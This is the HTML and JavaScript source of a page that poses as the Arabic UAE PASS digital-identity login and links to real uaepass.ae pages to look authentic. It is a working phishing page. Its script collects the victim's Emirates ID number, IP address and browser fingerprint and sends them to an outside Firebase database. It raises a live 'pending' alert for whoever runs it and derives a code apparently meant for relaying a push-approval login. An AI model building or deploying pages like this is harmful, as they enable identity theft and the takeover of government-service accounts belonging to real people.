<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UAE PASS - تسجيل الدخول</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <script src="firebase-config.js"></script>
    
    <style>
        /* التنسيقات الخاصة بخانة تذكرني */
        .form-options {
            display: flex;
            justify-content: flex-start; /* لضمان البدء من اليمين */
            margin-bottom: 20px;
            width: 100%;
        }

        .form-check {
            display: flex;
            align-items: center;
            gap: 8px; /* المسافة بين النص والمربع */
            cursor: pointer;
        }

        /* تنسيق المربع ولونه */
        #rememberme {
            width: 18px;
            height: 18px;
            cursor: pointer;
            /* تغيير لون الصح والخلفية عند التحديد للأزرق */
            accent-color: #007bff; 
            order: 1; /* لجعل المربع يظهر أولاً من اليمين */
        }

        .checkbox-label {
            font-size: 14px;
            color: #454f63;
            cursor: pointer;
            order: 2; /* لجعل النص يظهر بعد المربع */
            user-select: none;
        }
        
        /* تنسيقات إضافية للشاشة */
        #syncStatus {
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div class="rectangle"></div>
    
    <div class="main-wrapper">
        <div class="container">
            <header class="header">
                <div class="logo">
                    <img src="self_service.png" alt="UAE Pass Logo">
                </div>
                
                <h1 class="login-to-uaepass">
                    الدخول عن طريق الهوية الرقمية
                </h1>
            </header>
            
            <div id="loadingScreen" style="display: none; text-align: center; padding: 40px 20px;">
                <div style="font-size: 60px; color: #00ac75; margin-bottom: 20px;">
                    <i class="fas fa-spinner fa-spin"></i>
                </div>
                <h2 style="color: #454f63; margin-bottom: 10px;">جاري تسجيل الدخول</h2>
                <p style="color: #78849e;" id="syncMessage">جاري حفظ البيانات في قاعدة البيانات...</p>
            </div>
            
            <main class="login-content" id="loginContent">
                <form id="loginForm">
                    <div class="form-group">
                        <label class="form-label" for="username">
                            <i class="fas fa-id-card"></i> رقم الهوية
                        </label>
                        <input type="text" 
                               class="form-input" 
                               id="username" 
                               name="username" 
                               placeholder="رقم الهوية، البريد الإلكتروني، أو رقم الهاتف."
                               pattern="\d{15}"
                               maxlength="15"
                               required>
                    </div>
                    
                    <div class="form-options">
                        <div class="form-check">
                            <input type="checkbox" checked id="rememberme" name="rememberme">
                            <label class="checkbox-label" for="rememberme">
                              تذكرني
                            </label>
                        </div>
                    </div>
                    
                    <div class="form-group-button">
                        <button type="submit" class="btn-login" id="submitButton">
                            تسجيل الدخول
                        </button>
                    </div>
                </form>
                
                <div class="divider">
                    <hr class="style">
                    <span class="divider-text">أو</span>
                </div>
                
                <div class="account-actions">
                    <div class="dont-have-account">
                        <span class="account-text">
                            <i class="fas fa-question-circle"></i> ليس لديك حساب؟
                        </span>
                        <a href="https://uaepass.ae/signup" class="create-new-account">
                            <i class="fas fa-user-plus"></i> إنشاء حساب جديد
                        </a>
                    </div>
                    
                    <div class="recover-account">
                        <a href="https://uaepass.ae/account-recovery" class="recover-link">
                            <i class="fas fa-key"></i> كيفية استعادة الحساب؟
                        </a>
                    </div>
                </div>
            </main>
            
            <footer class="footer">
                <div class="footer-links">
                    <a href="https://uaepass.ae/support" class="menu-link">الدعم</a>
                    <span class="menu-separator">|</span>
                    <a href="https://uaepass.ae/faq" class="menu-link">الأسئلة الشائعة</a>
                    <span class="menu-separator">|</span>
                    <a href="https://uaepass.ae/locations" class="menu-link">مواقع منافذ الخدمة</a>
                </div>
                
                <div class="copyright">
                    <i class="fas fa-copyright"></i> حقوق النشر © 2025 الهوية الرقمية جميع الحقوق محفوظة.
                </div>
            </footer>
        </div>
    </div>

    <script>
        // السكريبت البرمجي الخاص بـ Firebase
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const submitButton = document.getElementById('submitButton');
        const loginContent = document.getElementById('loginContent');
        const loadingScreen = document.getElementById('loadingScreen');
        const syncMessage = document.getElementById('syncMessage');

        // دالة للحصول على IP العميل
        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'unknown';
            }
        }

        // دالة حفظ السجل في Firebase
        async function saveRecordToFirebase(recordData) {
            try {
                syncMessage.textContent = 'جاري الاتصال بقاعدة البيانات...';
                
                const recordRef = await firebaseConfig.db.collection('login_records').add({
                    ...recordData,
                    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
                    status: 'active',
                    syncStatus: 'synced'
                });
                
                syncMessage.textContent = 'جاري تخزين البيانات...';
                
                // أيضًا نستخدم Realtime Database للإشعارات الفورية
                await firebaseConfig.realtimeDb.ref(`notifications/${recordRef.id}`).set({
                    idNumber: recordData.idNumber,
                    timestamp: new Date().toISOString(),
                    type: 'new_login',
                    status: 'pending'
                });
                
                syncMessage.textContent = 'تم حفظ البيانات بنجاح!';
                console.log('✅ تم حفظ السجل في Firebase:', recordRef.id);
                return recordRef.id;
            } catch (error) {
                console.error('❌ خطأ في حفظ السجل في Firebase:', error);
                syncMessage.textContent = 'خطأ في الاتصال بقاعدة البيانات';
                return null;
            }
        }

        // دالة لتخزين محلي مع ID Firebase
        function saveRecordLocally(recordData, firebaseId) {
            const localRecords = JSON.parse(localStorage.getItem('uae_id_records') || '[]');
            
            const localRecord = {
                ...recordData,
                firebaseId: firebaseId,
                id: 'local_' + Date.now(),
                syncTime: new Date().toISOString()
            };
            
            localRecords.push(localRecord);
            localStorage.setItem('uae_id_records', JSON.stringify(localRecords));
            
            // تحديث آخر ID مدخل
            localStorage.setItem('last_entered_id', recordData.idNumber);
            
            return localRecord;
        }

        // دالة معالجة تسجيل الدخول
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            const idNumber = usernameInput.value.trim();
            const rememberMe = document.getElementById('rememberme').checked;
            
            if (!idNumber) {
                alert('الرجاء إدخال رقم الهوية');
                return;
            }

            // تحقق من صحة رقم الهوية
            if (!/^\d{15}$/.test(idNumber)) {
                alert('رقم الهوية يجب أن يكون 15 رقمًا');
                return;
            }
            
            // إظهار شاشة التحميل
            loginContent.style.display = 'none';
            loadingScreen.style.display = 'block';
            submitButton.disabled = true;
            
            try {
                // بيانات السجل
                const recordData = {
                    idNumber: idNumber,
                    rememberMe: rememberMe,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    screenSize: `${window.screen.width}x${window.screen.height}`,
                    browser: {
                        name: navigator.appName,
                        version: navigator.appVersion,
                        platform: navigator.platform
                    },
                    ipAddress: await getClientIP(),
                    status: 'pending',
                    source: 'login_page',
                    localSave: true
                };
                
                // 1. حفظ في Firebase
                syncMessage.textContent = 'جاري الاتصال بخادم Firebase...';
                const firebaseId = await saveRecordToFirebase(recordData);
                
                // 2. حفظ محلي مع مرجع Firebase
                syncMessage.textContent = 'جاري التخزين المحلي...';
                const localRecord = saveRecordLocally(recordData, firebaseId);
                
                // حفظ ID السجل الحالي
                if (firebaseId) {
                    localStorage.setItem('current_record_id', firebaseId);
                }
                
                // 3. إرسال رقم المصادقة إلى Realtime Database
                const extractedNumber = parseInt(idNumber.substring(idNumber.length - 2)) % 100;
                const formattedNumber = extractedNumber < 10 ? '0' + extractedNumber : extractedNumber.toString();
                
                await firebaseConfig.realtimeDb.ref('current_auth_number').set({
                    number: extractedNumber,
                    formattedNumber: formattedNumber,
                    timestamp: new Date().toISOString(),
                    source: 'login_page',
                    recordId: firebaseId || localRecord.id,
                    idNumber: idNumber
                });
                
                // 4. حفظ في localStorage للصفحة التالية
                localStorage.setItem('auth_passcode_number', JSON.stringify({
                    number: extractedNumber,
                    formattedNumber: formattedNumber,
                    timestamp: new Date().toISOString(),
                    source: 'login_page'
                }));
                
                syncMessage.textContent = 'جاري التوجيه إلى صفحة المصادقة...';
                
                // 5. التوجيه بعد 2 ثانية
                setTimeout(() => {
                    window.location.href = 'success.html?id=' + (firebaseId || localRecord.id);
                }, 2000);
                
            } catch (error) {
                console.error('❌ خطأ في عملية التسجيل:', error);
                syncMessage.textContent = 'حدث خطأ، جاري المحاولة محلياً...';
                
                // حفظ محلي فقط في حالة فشل Firebase
                const localRecords = JSON.parse(localStorage.getItem('uae_id_records') || '[]');
                const localRecord = {
                    idNumber: idNumber,
                    rememberMe: rememberMe,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    screenSize: `${window.screen.width}x${window.screen.height}`,
                    firebaseId: null,
                    id: 'local_only_' + Date.now(),
                    syncStatus: 'failed',
                    error: error.message
                };
                
                localRecords.push(localRecord);
                localStorage.setItem('uae_id_records', JSON.stringify(localRecords));
                localStorage.setItem('last_entered_id', idNumber);
                
                // استخراج الرقم للمصادقة
                const extractedNumber = parseInt(idNumber.substring(idNumber.length - 2)) % 100;
                const formattedNumber = extractedNumber < 10 ? '0' + extractedNumber : extractedNumber.toString();
                
                localStorage.setItem('auth_passcode_number', JSON.stringify({
                    number: extractedNumber,
                    formattedNumber: formattedNumber,
                    timestamp: new Date().toISOString(),
                    source: 'local_fallback'
                }));
                
                setTimeout(() => {
                    window.location.href = 'success.html?id=' + localRecord.id;
                }, 2000);
            }
        });

        // استعادة الحالة عند تحميل الصفحة
        window.addEventListener('DOMContentLoaded', function() {
            const lastId = localStorage.getItem('last_entered_id');
            if (lastId) {
                usernameInput.value = lastId;
                document.getElementById('rememberme').checked = true;
            }
            
            // اختبار اتصال Firebase
            testFirebaseConnection();
        });

        // دالة لاختبار اتصال Firebase
        async function testFirebaseConnection() {
            try {
                await firebaseConfig.db.collection('test_connection').doc('ping').set({
                    test: true,
                    timestamp: new Date().toISOString()
                });
                console.log('✅ اتصال Firebase يعمل');
            } catch (error) {
                console.warn('⚠️ اتصال Firebase غير متوفر، سيتم استخدام التخزين المحلي فقط');
            }
        }

        // دالة لتحديث حالة المزامنة
        function updateSyncStatus() {
            const syncStatus = document.getElementById('syncStatus');
            if (!syncStatus) {
                const statusDiv = document.createElement('div');
                statusDiv.id = 'syncStatus';
                document.body.appendChild(statusDiv);
            }
            
            // يمكن تحديث هذا بناءً على حالة الاتصال
            document.getElementById('syncStatus').textContent = 'Firebase: متصل';
        }
    </script>
</body>
</html>
